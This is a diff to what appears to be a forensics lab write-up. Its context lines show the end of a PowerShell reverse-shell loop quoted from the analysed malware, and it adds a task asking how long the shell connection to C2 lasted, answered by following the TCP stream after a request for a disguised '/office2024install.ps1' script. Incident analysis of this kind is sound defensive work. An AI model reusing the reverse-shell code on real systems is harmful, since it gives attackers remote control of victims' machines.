@@ -104,3 +104,9 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
 # Close the client socket when the loop ends (connection closed)
 $client.Close()
 ```
+
+## Task 5
+For how many seconds was the reverse shell connection established between C2 and the victim's workstation?
+
+### Explanation
+To find the answer, we can follow the TCP stream TCP stream that happened immediately after the request for **"/office2024install.ps1".
